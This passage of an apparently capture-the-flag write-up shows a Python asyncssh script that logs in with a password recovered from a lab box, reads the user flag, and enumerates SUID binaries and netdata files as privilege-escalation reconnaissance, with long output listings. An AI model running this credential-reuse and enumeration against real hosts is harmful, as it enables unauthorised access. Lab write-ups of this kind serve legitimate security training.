+<span class="giallo-l"><span class="z-12">./hibernate.cfg.xml-105-</span><span class="z-3">    &lt;</span><span class="z-6">property name=</span><span class="z-3">&quot;</span><span class="z-6">hibernate.connection.driver_class</span><span class="z-3">&quot;&gt;</span><span class="z-6">com.mysql.cj.jdbc.Driver</span><span class="z-3">&lt;</span><span class="z-6">/propert</span><span>y</span><span class="z-3">&gt;</span></span>
+<span class="giallo-l"><span class="z-12">./hibernate.cfg.xml-106-</span><span class="z-3">    &lt;</span><span class="z-6">property name=</span><span class="z-3">&quot;</span><span class="z-6">hibernate.dbcp.poolPreparedStatements</span><span class="z-3">&quot;&gt;true&lt;</span><span class="z-6">/propert</span><span>y</span><span class="z-3">&gt;</span></span>
+<span class="giallo-l"><span class="z-12">./hibernate.cfg.xml-107-</span><span class="z-3">    &lt;</span><span class="z-6">property name=</span><span class="z-3">&quot;</span><span class="z-6">hibernate.dbcp.maxOpenPreparedStatements</span><span class="z-3">&quot;&gt;</span><span class="z-6">20</span><span class="z-3">&lt;</span><span class="z-6">/propert</span><span>y</span><span class="z-3">&gt;</span></span>
+<span class="giallo-l"><span class="z-12">./hibernate.cfg.xml-108-</span></span>
+<span class="giallo-l"><span class="z-12">./hibernate.cfg.xml-109-</span><span class="z-3">    &lt;</span><span class="z-6">property name=</span><span class="z-3">&quot;</span><span class="z-6">hibernate.connection.charSet</span><span class="z-3">&quot;&gt;</span><span class="z-6">UTF-8</span><span class="z-3">&lt;</span><span class="z-6">/propert</span><span>y</span><span class="z-3">&gt;</span></span>
+<span class="giallo-l"><span class="z-2">...</span></span></code></pre><pre class="giallo z-code" data-lang="python"><code data-lang="python"><span class="giallo-l"><span>CREDENTIALS</span><span class="z-3">[&quot;</span><span class="z-6">oliver</span><span class="z-3">&quot;] = &quot;</span><span class="z-6">theEd1t0rTeam99</span><span class="z-3">&quot;</span></span></code></pre><pre class="giallo z-code" data-lang="python"><code data-lang="python"><span class="giallo-l"><span class="z-3 z-i">import</span><span> asyncssh</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">from</span><span> common</span><span class="z-3 z-i"> import</span><span> get_stdout</span><span class="z-3">,</span><span> hide_flag</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>USERNAME</span><span class="z-3"> = &quot;</span><span class="z-6">oliver</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span class="z-3 z-i">if</span><span> USERNAME</span><span class="z-3"> not in</span><span> CREDENTIALS</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    raise</span><span class="z-12"> ValueError</span><span class="z-3">(</span><span class="z-7">f</span><span class="z-6">&quot;Credentials for user &#39;</span><span class="z-10">{</span><span class="z-2">USERNAME</span><span class="z-10">}</span><span class="z-6">&#39; not found&quot;</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span>PASSWORD</span><span class="z-3"> =</span><span> CREDENTIALS</span><span class="z-3">[</span><span>USERNAME</span><span class="z-3">]</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">async with</span><span> asyncssh</span><span class="z-3">.</span><span class="z-2">connect</span><span class="z-3">(</span><span class="z-2">TARGET_HOST</span><span class="z-3">,</span><span class=" z-i"> username</span><span class="z-3">=</span><span class="z-2">USERNAME</span><span class="z-3">,</span><span class=" z-i"> password</span><span class="z-3">=</span><span class="z-2">PASSWORD</span><span class="z-3">)</span><span class="z-3 z-i"> as</span><span> conn</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span>    result</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> conn</span><span class="z-3">.</span><span class="z-2">run</span><span class="z-3">(&quot;</span><span class="z-6">id</span><span class="z-3">&quot;,</span><span class=" z-i"> check</span><span class="z-3">=True)</span></span>
+<span class="giallo-l"><span class="z-2">    print</span><span class="z-3">(&quot;</span><span class="z-6">[+] Current user:</span><span class="z-3">&quot;,</span><span class="z-2"> get_stdout</span><span class="z-3">(</span><span class="z-2">result</span><span class="z-3">),</span><span class=" z-i"> end</span><span class="z-3">=&quot;&quot;)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>    result</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> conn</span><span class="z-3">.</span><span class="z-2">run</span><span class="z-3">(&quot;</span><span class="z-6">cat user.txt</span><span class="z-3">&quot;,</span><span class=" z-i"> check</span><span class="z-3">=True)</span></span>
+<span class="giallo-l"><span class="z-2">    print</span><span class="z-3">(&quot;</span><span class="z-6">[+] User flag:</span><span class="z-3">&quot;,</span><span class="z-2"> hide_flag</span><span class="z-3">(</span><span class="z-2">get_stdout</span><span class="z-3">(</span><span class="z-2">result</span><span class="z-3">)),</span><span class=" z-i"> end</span><span class="z-3">=&quot;&quot;)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-1 z-i">    # find / -perm -4000 -type f 2&gt;/dev/null</span></span>
+<span class="giallo-l"><span>    result</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> conn</span><span class="z-3">.</span><span class="z-2">run</span><span class="z-3">(&quot;</span><span class="z-6">find / -perm -4000 -type f 2&gt;/dev/null</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span class="z-2">    print</span><span class="z-3">(</span><span class="z-2">get_stdout</span><span class="z-3">(</span><span class="z-2">result</span><span class="z-3">),</span><span class=" z-i"> end</span><span class="z-3">=&quot;&quot;)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-1 z-i">    # find / -group netdata -type f 2&gt;/dev/null</span></span>
+<span class="giallo-l"><span>    result</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> conn</span><span class="z-3">.</span><span class="z-2">run</span><span class="z-3">(&quot;</span><span class="z-6">find / -group netdata -type f 2&gt;/dev/null</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span class="z-2">    print</span><span class="z-3">(</span><span class="z-2">get_stdout</span><span class="z-3">(</span><span class="z-2">result</span><span class="z-3">),</span><span class=" z-i"> end</span><span class="z-3">=&quot;&quot;)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-1 z-i">    # found interesting netdata stuff</span></span>
+<span class="giallo-l"><span>    result</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> conn</span><span class="z-3">.</span><span class="z-2">run</span><span class="z-3">(&quot;</span><span class="z-6">ls -alh /opt/netdata/</span><span class="z-3">&quot;,</span><span class=" z-i"> check</span><span class="z-3">=True)</span></span>
+<span class="giallo-l"><span class="z-2">    print</span><span class="z-3">(</span><span class="z-2">get_stdout</span><span class="z-3">(</span><span class="z-2">result</span><span class="z-3">),</span><span class=" z-i"> end</span><span class="z-3">=&quot;&quot;)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>    result</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> conn</span><span class="z-3">.</span><span class="z-2">run</span><span class="z-3">(&quot;</span><span class="z-6">/opt/netdata/bin/netdata -W buildinfo</span><span class="z-3">&quot;,</span><span class=" z-i"> check</span><span class="z-3">=True)</span></span>
+<span class="giallo-l"><span class="z-2">    print</span><span class="z-3">(</span><span class="z-2">get_stdout</span><span class="z-3">(</span><span class="z-2">result</span><span class="z-3">),</span><span class=" z-i"> end</span><span class="z-3">=&quot;&quot;)</span></span></code></pre>
+<p>Output:</p>
+<pre class="giallo z-code" data-lang="plain" data-wrap="false"><code data-lang="plain" data-wrap="false"><span class="giallo-l"><span>[+] Current user: uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)</span></span>
+<span class="giallo-l"><span>[+] User flag: 92da...1da7</span></span>
+<span class="giallo-l"><span>/tmp/bash</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ioping</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin</span></span>
+<span class="giallo-l"><span>/usr/bin/newgrp</span></span>
+<span class="giallo-l"><span>/usr/bin/gpasswd</span></span>
+<span class="giallo-l"><span>/usr/bin/su</span></span>
+<span class="giallo-l"><span>/usr/bin/umount</span></span>
+<span class="giallo-l"><span>/usr/bin/chsh</span></span>
+<span class="giallo-l"><span>/usr/bin/fusermount3</span></span>
+<span class="giallo-l"><span>/usr/bin/sudo</span></span>
+<span class="giallo-l"><span>/usr/bin/passwd</span></span>
+<span class="giallo-l"><span>/usr/bin/mount</span></span>
+<span class="giallo-l"><span>/usr/bin/chfn</span></span>
+<span class="giallo-l"><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span></span>
+<span class="giallo-l"><span>/usr/lib/openssh/ssh-keysign</span></span>
+<span class="giallo-l"><span>/usr/libexec/polkit-agent-helper-1</span></span>
+<span class="giallo-l"><span>/run/ebpf.pid</span></span>
+<span class="giallo-l"><span>/run/netdata/netdata.pid</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/netdata-meta.db</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000007.njf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000010.njf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000005.njfv2</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/datafile-1-0000000008.ndf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000007.njfv2</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/datafile-1-0000000003.ndf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000009.njfv2</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000008.njfv2</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000001.njf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/datafile-1-0000000012.ndf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000009.njf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/datafile-1-0000000004.ndf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/datafile-1-0000000011.ndf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000002.njf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000011.njfv2</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000002.njfv2</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000003.njfv2</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000005.njf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/datafile-1-0000000002.ndf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000001.njfv2</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000004.njf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/datafile-1-0000000010.ndf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000012.njf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/datafile-1-0000000005.ndf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/datafile-1-0000000007.ndf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000006.njfv2</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000008.njf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000010.njfv2</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000006.njf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000004.njfv2</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/datafile-1-0000000009.ndf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/datafile-1-0000000001.ndf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000003.njf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/datafile-1-0000000006.ndf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000011.njf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/ml.db</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/netdata-meta.db-shm</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/netdata-meta.db-wal</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/ml.db-wal</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/.keep</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine-tier2/journalfile-1-0000000001.njf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine-tier2/datafile-1-0000000001.ndf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine-tier1/journalfile-1-0000000007.njf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine-tier1/journalfile-1-0000000005.njfv2</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine-tier1/datafile-1-0000000003.ndf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine-tier1/journalfile-1-0000000001.njf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine-tier1/datafile-1-0000000004.ndf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine-tier1/journalfile-1-0000000002.njf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine-tier1/journalfile-1-0000000002.njfv2</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine-tier1/journalfile-1-0000000003.njfv2</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine-tier1/journalfile-1-0000000005.njf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine-tier1/datafile-1-0000000002.ndf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine-tier1/journalfile-1-0000000001.njfv2</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine-tier1/journalfile-1-0000000004.njf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine-tier1/datafile-1-0000000005.ndf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine-tier1/datafile-1-0000000007.ndf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine-tier1/journalfile-1-0000000006.njfv2</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine-tier1/journalfile-1-0000000006.njf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine-tier1/journalfile-1-0000000004.njfv2</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine-tier1/datafile-1-0000000001.ndf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine-tier1/journalfile-1-0000000003.njf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/dbengine-tier1/datafile-1-0000000006.ndf</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/ml.db-shm</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/context-meta.db-shm</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/context-meta.db</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/cache/netdata/context-meta.db-wal</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/lib/netdata/dbengine_multihost_size</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/lib/netdata/.keep</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/lib/netdata/lock/logind.collector.lock</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/lib/netdata/lock/systemdunits_service-units.collector.lock</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/lib/netdata/netdata_random_session_id</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/lib/netdata/netdata.tarball.checksum</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/lib/netdata/registry/netdata.public.unique.id</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/lib/netdata/.agent_crash</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/lib/netdata/netdata.api.key</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/lib/netdata/god-jobs-statuses.json</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/log/netdata/access.log.1</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/log/netdata/debug.log</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/log/netdata/.keep</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/log/netdata/aclk.log</span></span>
+<span class="giallo-l"><span>/opt/netdata/var/log/netdata/access.log</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/charts.d.plugin</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/slabinfo.plugin</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/debugfs.plugin</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/apps.plugin</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/go.d.plugin</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network-helper.sh</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/python.d.plugin</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ioping</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ioping.plugin</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/perf.plugin</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_xfs.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_cachestat.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_zfs.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_msync.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_dc.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_fd.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_fsync.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_fdatasync.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_fd.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_swap.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_xfs.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_nfs.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_process.5.10.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_process.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_socket.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_cachestat.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_xfs.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_dc.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_disk.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_socket.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_swap.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_btrfs.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_ext4.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_hardirq.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_fsync.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_ext4.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_process.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_vfs.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_softirq.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_mount.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_sync_file_range.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_swap.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_sync.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_swap.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_msync.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_socket.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_sync_file_range.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_network_viewer.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_zfs.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_swap.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_socket.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_socket.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_shm.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_network_viewer.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_sync_file_range.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_disk.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_ext4.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_syncfs.5.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_shm.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_btrfs.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_disk.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_syncfs.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_msync.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_shm.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_hardirq.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_sync.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_btrfs.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_process.5.10.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_fd.5.11.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_mount.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_process.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_vfs.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_mdflush.5.4.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_cachestat.5.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_disk.4.18.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_swap.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_sync.4.16.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_cachestat.4.14.o</span></span>
+<span class="giallo-l"><span>/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_nfs.4.18.o</span></span>
